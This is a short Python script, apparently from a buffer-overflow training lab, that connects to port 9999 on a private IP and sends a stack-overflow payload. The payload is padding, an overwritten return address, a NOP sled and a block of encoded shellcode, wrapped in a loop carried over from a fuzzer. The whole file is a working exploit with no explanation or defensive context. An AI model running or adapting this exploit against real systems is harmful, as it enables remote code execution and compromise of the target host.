#!/usr/bin/env python3

import socket, time, sys

ip = "192.168.245.133"
port = 9999
timeout = 5

shellcode=("\xbd\xfe\xfe\x0e\x6c\xda\xde\xd9\x74\x24\xf4\x58\x31\xc9\xb1"
"\x52\x83\xe8\xfc\x31\x68\x0e\x03\x96\xf0\xec\x99\x9a\xe5\x73"
"\x61\x62\xf6\x13\xeb\x87\xc7\x13\x8f\xcc\x78\xa4\xdb\x80\x74"
"\x4f\x89\x30\x0e\x3d\x06\x37\xa7\x88\x70\x76\x38\xa0\x41\x19"
"\xba\xbb\x95\xf9\x83\x73\xe8\xf8\xc4\x6e\x01\xa8\x9d\xe5\xb4"
"\x5c\xa9\xb0\x04\xd7\xe1\x55\x0d\x04\xb1\x54\x3c\x9b\xc9\x0e"
"\x9e\x1a\x1d\x3b\x97\x04\x42\x06\x61\xbf\xb0\xfc\x70\x69\x89"
"\xfd\xdf\x54\x25\x0c\x21\x91\x82\xef\x54\xeb\xf0\x92\x6e\x28"
"\x8a\x48\xfa\xaa\x2c\x1a\x5c\x16\xcc\xcf\x3b\xdd\xc2\xa4\x48"
"\xb9\xc6\x3b\x9c\xb2\xf3\xb0\x23\x14\x72\x82\x07\xb0\xde\x50"
"\x29\xe1\xba\x37\x56\xf1\x64\xe7\xf2\x7a\x88\xfc\x8e\x21\xc5"
"\x31\xa3\xd9\x15\x5e\xb4\xaa\x27\xc1\x6e\x24\x04\x8a\xa8\xb3"
"\x6b\xa1\x0d\x2b\x92\x4a\x6e\x62\x51\x1e\x3e\x1c\x70\x1f\xd5"
"\xdc\x7d\xca\x7a\x8c\xd1\xa5\x3a\x7c\x92\x15\xd3\x96\x1d\x49"
"\xc3\x99\xf7\xe2\x6e\x60\x90\xcc\xc7\x9f\xe0\xa5\x15\x5f\xc2"
"\x1c\x93\xb9\x6e\x4f\xf5\x12\x07\xf6\x5c\xe8\xb6\xf7\x4a\x95"
"\xf9\x7c\x79\x6a\xb7\x74\xf4\x78\x20\x75\x43\x22\xe7\x8a\x79"
"\x4a\x6b\x18\xe6\x8a\xe2\x01\xb1\xdd\xa3\xf4\xc8\x8b\x59\xae"
"\x62\xa9\xa3\x36\x4c\x69\x78\x8b\x53\x70\x0d\xb7\x77\x62\xcb"
"\x38\x3c\xd6\x83\x6e\xea\x80\x65\xd9\x5c\x7a\x3c\xb6\x36\xea"
"\xb9\xf4\x88\x6c\xc6\xd0\x7e\x90\x77\x8d\xc6\xaf\xb8\x59\xcf"
"\xc8\xa4\xf9\x30\x03\x6d\x19\xd3\x81\x98\xb2\x4a\x40\x21\xdf"
"\x6c\xbf\x66\xe6\xee\x35\x17\x1d\xee\x3c\x12\x59\xa8\xad\x6e"
"\xf2\x5d\xd1\xdd\xf3\x77")

string="A" * 524 + "\xF3\x12\x17\x31" + "\x90" * 16 + shellcode


while True:
  try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.settimeout(timeout)
      s.connect((ip, port))
      s.recv(1024)
      print("Fuzzing with {} bytes".format(len(string)))
      s.send(bytes(string, "latin-1"))
      s.recv(1024)
  except:
    print("Fuzzing crashed at {} bytes".format(len(string)))
    sys.exit(0)
  string += 100 * "A"
  time.sleep(1)
